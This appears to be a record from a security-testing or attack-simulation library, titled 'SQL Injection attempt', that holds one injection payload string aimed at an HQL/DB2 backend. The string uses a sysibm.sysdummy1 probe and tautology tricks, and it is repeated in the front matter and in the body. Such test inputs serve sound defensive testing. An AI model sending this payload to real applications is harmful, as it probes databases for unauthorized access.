---
id: 4d61e246-28d4-4da2-8dfe-d3900a30b45c
name: SQL Injection attempt
type: command
executor: bash
data: dummy' and hqli.persistent.Constants.C_QUOTE_1*X('<>CHAR(41) and (select count(1)
  from sysibm.sysdummy1)>0 --')=1 and '1'='1
output: null
created_at: '2023-04-06T03:56:33.438498+00:00'
updated_at: '2023-04-10T20:22:27.355781+00:00'
---

# SQL Injection attempt

```bash
dummy' and hqli.persistent.Constants.C_QUOTE_1*X('<>CHAR(41) and (select count(1) from sysibm.sysdummy1)>0 --')=1 and '1'='1
```
